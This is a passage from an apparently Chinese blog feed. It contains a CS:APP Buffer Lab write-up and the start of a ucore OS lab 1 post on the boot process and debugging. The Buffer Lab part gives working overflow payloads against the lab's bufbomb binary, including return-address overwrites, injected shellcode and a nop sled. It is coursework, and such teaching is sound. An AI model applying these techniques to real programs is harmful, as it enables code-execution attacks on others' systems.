  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Dud: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>
</code></pre>
<p>其中，Smoke源码： </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">smoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Smoke!: You calledsmoke()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
<span class="token punctuation">}</span>
</code></pre>
<p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
<a id="more"></a>
<p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
<p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
<pre><code>+---------------+
|               |
| getbuf返回地址 |
|               |
+---------------+
|               |
|     %ebp      |
|               |
+---------------+
|               |
|               |
|               |
|      buf      |
|               |
|    40 byte    |
|               |
|               |
|               |
+---------------+
|               |
|     %esp      |
|               |
+---------------+
</code></pre><p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
</code></pre><h2 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h2><p>bufbomb中有个函数fizz:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">fizz</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fizz!: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>
</code></pre>
<p>题目要求和level 0类似，就是让程序执行fizz而不是返回test。区别就是这个fizz函数要求传入参数，而且传入的参数必须是自己的cookie。</p>
<pre><code>08048c42 &lt;fizz&gt;:
 8048c42: 55                    push   %ebp
 8048c43: 89 e5                 mov    %esp,%ebp
 8048c45: 83 ec 18              sub    $0x18,%esp
 8048c48: 8b 45 08              mov    0x8(%ebp),%eax
 8048c4b: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
 8048c51: 75 26                 jne    8048c79 &lt;fizz+0x37&gt;
 8048c53: 89 44 24 08           mov    %eax,0x8(%esp)
 8048c57: c7 44 24 04 ee a4 04  movl   $0x804a4ee,0x4(%esp)
 8048c5e: 08 
 8048c5f: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c66: e8 55 fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048c6b: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c72: e8 04 07 00 00        call   804937b &lt;validate&gt;
 8048c77: eb 18                 jmp    8048c91 &lt;fizz+0x4f&gt;
 8048c79: 89 44 24 08           mov    %eax,0x8(%esp)
 8048c7d: c7 44 24 04 40 a3 04  movl   $0x804a340,0x4(%esp)
 8048c84: 08 
 8048c85: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c8c: e8 2f fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048c91: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 8048c98: e8 63 fc ff ff        call   8048900 &lt;exit@plt&gt;
</code></pre><p>通过反汇编，可以发现变量val存在0x8(%ebp)这个位置，所以需要将0x8(%ebp)位置的值修改为cookie。首先前面的44位用非0a数填充，接着应该用fizz的地址08048c42替换原来的返回地址。然后添加4个非0a数，之后就应该添加cookie了。注意cookie也是用到小端表示。</p>
<p>所以构成了:</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 88 41 9d 21
</code></pre><h2 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h2><p>让getbuf调用后执行bang函数，同时修改global_value。因为global_value是全局变量，所以并没储存在栈中。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> global_value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">bang</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>global_value <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bang!: You set global_value to 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: global_value = 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过反汇编:</p>
<pre><code>08048c9d &lt;bang&gt;:
 8048c9d: 55                    push   %ebp
 8048c9e: 89 e5                 mov    %esp,%ebp
 8048ca0: 83 ec 18              sub    $0x18,%esp
 8048ca3: a1 00 d1 04 08        mov    0x804d100,%eax
 8048ca8: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
 8048cae: 75 26                 jne    8048cd6 &lt;bang+0x39&gt;
 8048cb0: 89 44 24 08           mov    %eax,0x8(%esp)
 8048cb4: c7 44 24 04 60 a3 04  movl   $0x804a360,0x4(%esp)
 8048cbb: 08 
 8048cbc: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048cc3: e8 f8 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048cc8: c7 04 24 02 00 00 00  movl   $0x2,(%esp)
 8048ccf: e8 a7 06 00 00        call   804937b &lt;validate&gt;
 8048cd4: eb 18                 jmp    8048cee &lt;bang+0x51&gt;
 8048cd6: 89 44 24 08           mov    %eax,0x8(%esp)
 8048cda: c7 44 24 04 0c a5 04  movl   $0x804a50c,0x4(%esp)
 8048ce1: 08 
 8048ce2: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048ce9: e8 d2 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048cee: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 8048cf5: e8 06 fc ff ff        call   8048900 &lt;exit@plt&gt;
</code></pre><p>在gdb中先在getbuf处设置断点， 接着</p>
<pre><code>(gdb) r -u xinqiu
</code></pre><p>让其继续运行到断点处。根据上述的反汇编代码，用 <code>x/i 0x804d100</code> 得到</p>
<pre><code>(gdb) x/i 0x804d100
   0x804d100 &lt;global_value&gt;:  add    %al,(%eax)
</code></pre><p>可以知道0x804d100放的是global_value。如果想执行某一个函数，那么就把该函数的入口地址入栈。所以能写出漏洞利用代码，将cookie传入全局变量的地址中，然后将bang的入口地址入栈，接着用ret运行。将以下汇编代码保存到level2.S中。</p>
<pre><code>movl $0x219d4188,0x804d100
pushl $0x08048c9d
ret
</code></pre><p>按照writeup，使用</p>
<pre class=" language-bash"><code class="language-bash">gcc -m32 -c level2.S
</code></pre>
<p>编译，再用objdump反汇编</p>
<pre class=" language-bash"><code class="language-bash">objdump -d level2.o <span class="token operator">></span> level2.d
</code></pre>
<p>通过查看level2.d</p>
<pre><code>
level2.o:     file format elf32-i386


Disassembly of section .text:

00000000 &lt;.text&gt;:
   0: c7 05 00 d1 04 08 88  movl   $0x219d4188,0x804d100
   7: 41 9d 21 
   a: 68 9d 8c 04 08        push   $0x8048c9d
   f: c3                    ret
</code></pre><p>将getbuf的返回地址改成buf的首地址运行，上一个栈的4字节改成bang函数的地址。这样当在getbuf中调用ret返回时程序会跳转到buf处上面的构造的恶意函数（指令），再通过恶意函数中的ret指令跳转原栈中bang的入口地址，再进入bang函数中执行。</p>
<p>为了得到buf的运行地址，可以使用gdb来获取</p>
<pre><code>(gdb) p/x ($ebp-0x28)
$1 = 0x55683168
</code></pre><p>现在可以构造文本文件level2.txt,首先前40个字节中先用level2.d左边的操作码填充，剩余空位用00填充，接着用4个00覆盖保存的%ebp地址，最后将恶意函数的入口地址覆盖原来的返回地址，通过ret执行这个恶意函数。</p>
<pre><code>c7 05 00 d1 04 08 88 41 9d 21 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 31 68 55
</code></pre><h2 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h2><p>让getbuf正常返回到test函数，同时返回值为cookie。所以需要恢复被破坏的栈环境，将溢出前的正确的返回地址入栈，然后执行ret。因为getbuf的返回值在%eax寄存器中，溢出时会覆盖%ebp，所以需要进行恢复。</p>
<p>使用GDB</p>
<pre><code>(gdb) b test
</code></pre><p>接着</p>
<pre><code>(gdb) r -u xinqiu
</code></pre><p>通过查看pc寄存器的位置</p>
<pre><code>(gdb) x/10i $pc
=&gt; 0x8048dae &lt;test+4&gt;:  sub    $0x24,%esp
   0x8048db1 &lt;test+7&gt;:  call   0x8048d90 &lt;uniqueval&gt;
   0x8048db6 &lt;test+12&gt;: mov    %eax,-0xc(%ebp)
   0x8048db9 &lt;test+15&gt;: call   0x80491f4 &lt;getbuf&gt;
   0x8048dbe &lt;test+20&gt;: mov    %eax,%ebx
   0x8048dc0 &lt;test+22&gt;: call   0x8048d90 &lt;uniqueval&gt;
   0x8048dc5 &lt;test+27&gt;: mov    -0xc(%ebp),%edx
   0x8048dc8 &lt;test+30&gt;: cmp    %edx,%eax
   0x8048dca &lt;test+32&gt;: je     0x8048dda &lt;test+48&gt;
   0x8048dcc &lt;test+34&gt;: movl   $0x804a388,(%esp)
</code></pre><p>可以知道在getbuf函数返回后的一条指令是 <code>0x8048dbe</code>。</p>
<p>下面就是要构造攻击代码。需要将cookie传入eax寄存器，接着通过push入栈，ret返回来继续执行之后的代码。</p>
<pre><code>mov $0x219d4188,%eax
push $0x08048dbe
ret
</code></pre><p>类似Level 2的操作，可以得到攻击文本文件</p>
<pre><code>b8 88 41 9d 21 68 be 8d 04 08
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
c0 31 68 55
68 31 68 55
</code></pre><p>其中，倒数第二行是保存的ebp寄存器地址。</p>
<h2 id="Level_4"><a href="#Level_4" class="headerlink" title="Level 4"></a>Level 4</h2><p>首先通过反汇编得到:</p>
<pre><code>0804920c &lt;getbufn&gt;:
 804920c: 55                    push   %ebp
 804920d: 89 e5                 mov    %esp,%ebp
 804920f: 81 ec 18 02 00 00     sub    $0x218,%esp
 8049215: 8d 85 f8 fd ff ff     lea    -0x208(%ebp),%eax
 804921b: 89 04 24              mov    %eax,(%esp)
 804921e: e8 d7 fa ff ff        call   8048cfa &lt;Gets&gt;
 8049223: b8 01 00 00 00        mov    $0x1,%eax
 8049228: c9                    leave  
 8049229: c3                    ret    
 804922a: 90                    nop
 804922b: 90                    nop
</code></pre><p>通过 p/x ($ebp-0x208) 可以知道buf的首地址为 0x55682f88，且buf为520个字节大小。因为getbufn被执行了五次，通过gdb continue 5次，每次都查看buf地址，可以得到每次的首地址。</p>
<pre><code>0x55682f88
0x55682f48
0x55682fe8
0x55682f28
0x55682f08
</code></pre><p>根据testn的前一部分反汇编代码</p>
<pre><code> 08048e26 &lt;testn&gt;:
 8048e26: 55                    push   %ebp
 8048e27: 89 e5                 mov    %esp,%ebp
 8048e29: 53                    push   %ebx
 8048e2a: 83 ec 24              sub    $0x24,%esp
 8048e2d: e8 5e ff ff ff        call   8048d90 &lt;uniqueval&gt;
 8048e32: 89 45 f4              mov    %eax,-0xc(%ebp)
 8048e35: e8 d2 03 00 00        call   804920c &lt;getbufn&gt;
 8048e3a: 89 c3                 mov    %eax,%ebx
</code></pre><p>esp和ebp寄存器相等，所以当 push %ebx 时， 此时的 %ebp = %esp + 0x4, sub    $0x24,%esp 之后， %ebp = %esp + 0x28,这个就是%esp和%ebp每次的变化关系。此外可以知道call getbufn的下一条指令的地址为 0x8048e3a。</p>
<p>所以得出汇编代码</p>
<pre><code>lea 0x28(%esp),%ebp
mov $0x219d4188,%eax
push $0x8048e3a
ret
</code></pre><p>根据建议， buf的520个自己空间加上返回地址和ebp共528个字节，去掉返回地址和攻击的指令字节码，剩余的都用nop也就是0x90填充。也就是509个nop形成”nop sled”。</p>
<pre><code>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 
8d 6c 24 28 b8 88 41 9d 21 68 3a 8e 04 08 c3 
e8 2f 68 55
</code></pre><p>最后的返回地址，选择最大buf地址来覆盖，也就是用0x55682f08。</p>
<p>值得注意的是，在运行hex2raw程序时需要添上 -n 这个参数。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>BufLab 算是完成了，稍微对模拟缓冲区溢出熟悉了一点，加深了对程序堆栈的理解。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>清华操作系统课程学习</title>
    <link href="http://xinqiu.me/2016/03/17/ucore/"/>
    <id>http://xinqiu.me/2016/03/17/ucore/</id>
    <published>2016-03-16T16:00:00.000Z</published>
    <updated>2016-04-28T14:27:09.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>因为学习操作系统，因为还有一些其他事情要做，所以没有直接上MIT 6.828,选择了清华的操作系统课和配套的ucore。</p>
</blockquote>
<h2 id="u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B"><a href="#u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B" class="headerlink" title="从机器启动到操作系统运行的过程"></a>从机器启动到操作系统运行的过程</h2><p>在机器接通电源后， 会向主板发送一个信号。一旦主板收到电源妥协信号后，主板会尝试启动CPU，CPU复位寄存器里的所有数据， 设置预定值给每个寄存器。同时执行系统初始化软件完成基本IO初始化和引导加载功能。为最终调用操作系统内核准备好正确的环境。最终引导加载程序把操作系统内核映像加载到RAM中，并将系统控制权传递给它。</p>
<p>以Intel 80386为例，计算机加电后，CPU从物理地址0xFFFFFFF0(由初始化的CS：EIP确定，此时CS和IP的值分别是0xF000和0xFFF0)开始执行。8086 处理器有一个20位寻址总线，这意味着它可以对0到 2^20 位地址空间进行操作（ 1Mb ）。不过它只有16位的寄存器，通过这个16位寄存器最大寻址是 2^16 即 0xffff （64 Kb）。实模式使用分段机制来管理整个内存空间。所有内存被分成固定的 64KB 大小的小块。由于我们不能用16位寄存器寻址大于 64KB 的内存，一种替代的方法被设计出来了。一个地址包括两个部分：数据段起始地址和从该数据段起的偏移量。为了得到内存中的物理地址，我们要让数据段乘16并加上偏移量：</p>
<pre><code>PhysicalAddress = Segment * 16 + Offset
</code></pre><p>通过阅读 kernel boot protocol，在内核被引导如内存后，内存使用情况将入下表所示：</p>
<pre><code>         | Protected-mode kernel  |
100000   +------------------------+
         | I/O memory hole        |
0A0000   +------------------------+
         | Reserved for BIOS      | Leave as much as possible unused
         ~                        ~
         | Command line           | (Can also be below the X+10000 mark)
X+10000  +------------------------+
         | Stack/heap             | For use by the kernel real-mode code.
X+08000  +------------------------+
         | Kernel setup           | The kernel real-mode code.
         | Kernel boot sector     | The kernel legacy boot sector.
       X +------------------------+
         | Boot loader            | &lt;- Boot sector entry point 0x7C00
001000   +------------------------+
         | Reserved for MBR/BIOS  |
000800   +------------------------+
         | Typically used by MBR  |
000600   +------------------------+
         | BIOS use only          |
000000   +------------------------+
</code></pre><p>所以当 bootloader 完成任务，将执行权移交给 kernel，kernel 的代码从以下地址开始执行：</p>
<pre><code>0x1000 + X + sizeof(KernelBootSector) + 1
</code></pre><p>上面的公式中， X 是 kernel bootsector 被引导如内存的位置。</p>
<h2 id="Lab_1"><a href="#Lab_1" class="headerlink" title="Lab 1"></a>Lab 1</h2><h3 id="u7EC3_u4E601"><a href="#u7EC3_u4E601" class="headerlink" title="练习1"></a>练习1</h3><p>1.操作系统镜像文件ucore.img是如何一步一步生成的？</p>
<p>在进行 <code>make V=</code>后，通过显示的信息，可以知道先对C文件进行了编译。分别编译了一下文件:</p>
<ul>
<li>cc kern/init/init.c 初始化系统</li>
<li>cc kern/libs/readline.c 从输入中读取一行</li>
<li>cc kern/libs/stdio.c 标准化IO</li>
<li>cc kern/debug/kdebug.c debug支撑文件</li>
<li>cc kern/debug/kmonitor.c 命令行显示器</li>
<li>cc kern/debug/panic.c 显示错误警告</li>
<li>cc kern/driver/clock.c 时钟相关</li>
<li>cc kern/driver/console.c 控制台显示</li>
<li>cc kern/driver/intr.c 中断请求</li>
<li>cc kern/driver/picirq.c 中断控制器</li>
<li>cc kern/trap/trap.c 中断处理</li>
<li>cc kern/trap/trapentry.S 中断预处理</li>
<li>cc kern/trap/vectors.S 中断向量表</li>
<li>cc kern/mm/pmm.c 全局描述符表</li>
<li>cc libs/printfmt.c 输出格式</li>
<li>cc libs/string.c 字符串操作</li>
<li>cc boot/bootasm.S Boot Loader程序</li>
<li>cc boot/bootmain.c Boot Loader程序</li>
<li>cc tools/sign.c 硬盘主引导扇区检测</li>
</ul>
<p>接着 <code>ld</code> 命令对编译好的 <code>.o</code> 文件进行链接，生成了引导扇区。</p>
<p>之后用 <code>dd</code> 创建了一块空间，并将 <code>bootblock</code> 放入这块空间做成 <code>img</code> 硬盘。</p>
<p>2.一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
<p>从 <code>tools/sign.c</code> 源文件中可以得知， </p>
<pre class=" language-C"><code class="language-C">
.....
if (st.st_size > 510) {
        fprintf(stderr, "%lld >> 510!!\n", (long long)st.st_size);
        return -1;
}
char buf[512];
......
buf[510] = 0x55;
buf[511] = 0xAA;
......
if (size != 512) {
    fprintf(stderr, "write '%s' error, size is %d.\n", argv[2], size);
    return -1;
}
fclose(ofp);
printf("build 512 bytes boot sector: '%s' success!\n", argv[2]);
......
</code></pre>
<p>规范的硬盘主引导扇区大小为512， 并且最后两位必须是 <code>0x55AA</code>.</p>
<h3 id="u7EC3_u4E602"><a href="#u7EC3_u4E602" class="headerlink" title="练习2"></a>练习2</h3><p>使用qemu执行并调试lab1中的软件，要做一下几个操作：</p>
<ol>
<li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
</li>
<li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
</li>
<li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
</li>
<li><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
</li>
</ol>
<p>根据参考的提示，在 <code>.PHONY: qemu qemu-nox debug debug-nox</code> 下添加</p>
<pre><code>lab1-mon: $(UCOREIMG)
    $(V)$(TERMINAL) -e &quot;$(QEMU) -S -s -d in_asm -D $(BINDIR)/q.log -monitor stdio -hda $&lt; -serial null&quot;
    $(V)sleep 2
    $(V)$(TERMINAL) -e &quot;gdb -q -x tools/lab1init&quot;
</code></pre><p>在调用qemu时添加-d in_asm -D q.log参数可以将运行的汇编指令保存在q.log中。</p>
<p>另外需要先在<code>lab1/tools/</code>文件夹下新建一个<code>lab1init</code>文件。添加以下内容</p>
<pre><code>file bin/kernel
target remote :1234
set architecture i8086
break *0x7c00
continue
x /2i $pc
</code></pre><p>分别代表加载kernel， 与qemu链接， BIOS是i8086 16位实模式， 在0x7c00处设置断点， 继续运行， 显示指令寄存器上的两条指令。</p>
<p>make lab1-mon 产生的汇编代码还是稍微有点区别，主要在0x7c1e开始有点区别。</p>
<p>#####gdb的单步命令</p>
<p>在gdb中，有next, nexti, step, stepi等指令来单步调试程序，他们功能各不相同，区别在于单步的“跨度”上。</p>
<ul>
<li>next 单步到程序源代码的下一行，不进入函数。</li>
<li>nexti 单步一条机器指令，不进入函数。</li>
<li>step 单步到下一个不同的源代码行（包括进入函数）。</li>
<li>stepi 单步一条机器指令。</li>
</ul>
<h3 id="u7EC3_u4E603"><a href="#u7EC3_u4E603" class="headerlink" title="练习3"></a>练习3</h3><p>参考<a href="http://blog.csdn.net/xiaocainiaoshangxiao/article/details/22417237" target="_blank" rel="external">MIT6.828 boot.S文件分析</a>这篇文章。</p>
<pre><code>#include &lt;asm.h&gt;

# Start the CPU: switch to 32-bit protected mode, jump into C.
# The BIOS loads this code from the first sector of the hard disk into
# memory at physical address 0x7c00 and starts executing in real mode
# with %cs=0 %ip=7c00.

#启动CPU，切换到32位保护模式，跳转到C代码  
#BIOS从硬盘的第一个扇区加载这个代码到  
#物理内存地址为0x7c00的地方，cs=0,ip=7c00  

#下面的3条.set指令类似于宏定义  
#内核代码段选择子
.set PROT_MODE_CSEG,        0x8                     # kernel code segment selector
#内核数据段选择子 
.set PROT_MODE_DSEG,        0x10                    # kernel data segment selector
#保护模式使能标志
.set CR0_PE_ON,             0x1                     # protected mode enable flag

# start address should be 0:7c00, in real mode, the beginning address of the running bootloader
#开始地址在实模式下是0:7c00，这个开始地址就是运行bootloader的地址

#定义一个全局名字start 
.globl start
start:
#CPU启动为16位模式 
.code16                                             # Assemble for 16-bit mode
    #关中断
    cli                                             # Disable interrupts
    #清除方向标志 
    cld                                             # String operations increment

    # Set up the important data segment registers (DS, ES, SS).
    #设置重要的数据段寄存器  
    #ax,ds, es, ss清零
    xorw %ax, %ax                                   # Segment number zero
    movw %ax, %ds                                   # -&gt; Data Segment
    movw %ax, %es                                   # -&gt; Extra Segment
    movw %ax, %ss                                   # -&gt; Stack Segment

    # Enable A20:
    #  For backwards compatibility with the earliest PCs, physical
    #  address line 20 is tied low, so that addresses higher than
    #  1MB wrap around to zero by default. This code undoes this.
    #打开A20地址线  
    #为了兼容早期的PC机，第20根地址线在实模式下不能使用  
    #所以超过1MB的地址，默认就会返回到地址0，重新从0循环计数，  
    #下面的代码打开A20地址线 
seta20.1:
    #从0x64端口读入一个字节的数据到al中 
    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).
    testb $0x2, %al
    #如果上面的测试中发现al的第2位为0，就不执行该指令  
    #否则就循环检查
    jnz seta20.1

    #将0xd1写入到al中
    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64
    #将al中的数据写入到端口0x64中,也就是8042的P2端口
    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port

seta20.2:
    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).
    #测试al的第2位是否为0
    testb $0x2, %al
    jnz seta20.2

    #将0xdf写入到al中 
    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60
    #将al中的数据写入到0x60端口中，也就是让P2端口的A20位设置为1
    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1

    # Switch from real to protected mode, using a bootstrap GDT
    # and segment translation that makes virtual addresses
    # identical to physical addresses, so that the
    # effective memory map does not change during the switch.
    #将全局描述符表描述符加载到全局描述符表寄存器
    lgdt gdtdesc
    #cr0中的第0位为1表示处于保护模式  
    #cr0中的第0位为0，表示处于实模式  
    #把控制寄存器cr0加载到eax中 
    movl %cr0, %eax
    #将eax中的第0位设置为1
    orl $CR0_PE_ON, %eax
    #将eax中的值装入cr0中 
    movl %eax, %cr0

    # Jump to next instruction, but in 32-bit code segment.
    # Switches processor into 32-bit mode.
    ljmp $PROT_MODE_CSEG, $protcseg
    #跳转到32位模式中的下一条指令  
    #将处理器切换为32位工作模式  
    #下面这条指令执行的结果会将$PROT_MODE_CSEG加载到cs中，cs对应的高速缓冲存储器会加载代码段描述符  
    #同样将$protcseg加载到ip中

.code32                                             # Assemble for 32-bit mode
protcseg:
    # Set up the protected-mode data segment registers
    #设置保护模式下的数据寄存器  
    #将数据段选择子装入到ax中
    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector
    #将ax装入到其他数据段寄存器中，在装入的同时，  
    #数据段描述符会自动的加入到这些段寄存器对应的高速缓冲寄存器中 
    movw %ax, %ds                                   # -&gt; DS: Data Segment
    movw %ax, %es                                   # -&gt; ES: Extra Segment
    movw %ax, %fs                                   # -&gt; FS
    movw %ax, %gs                                   # -&gt; GS
    movw %ax, %ss                                   # -&gt; SS: Stack Segment

    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)
    #设置栈指针，并且调用c函数 
    movl $0x0, %ebp
    #调用main.c中的bootmain函数 
    movl $start, %esp
    call bootmain

    # If bootmain returns (it shouldn&#39;t), loop.
    #如果bootmain返回的话，就一直循环
spin:
    jmp spin

# Bootstrap GDT
#强制4字节对齐
.p2align 2                                          # force 4 byte alignment
#全局描述符表
gdt:
    SEG_NULLASM                                     # null seg
    #代码段描述符
    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel
    #数据段描述符
    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel

#全局描述符表对应的描述符 
gdtdesc:
    .word 0x17                                      # sizeof(gdt) - 1
    .long gdt                                       # address gdt
</code></pre><h3 id="u7EC3_u4E604"><a href="#u7EC3_u4E604" class="headerlink" title="练习4"></a>练习4</h3><p>通过分析源代码和通过qemu来运行并调试bootloader&amp;OS，</p>
<ul>
<li>bootloader如何读取硬盘扇区的？</li>
<li>bootloader是如何加载ELF格式的OS？</li>
</ul>
<p>在bootmain.c中有介绍。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* readsect - read a single sector at @secno into @dst */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">readsect</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dst<span class="token punctuation">,</span> uint32_t secno<span class="token punctuation">)</span> <span class="token punctuation">{</span>
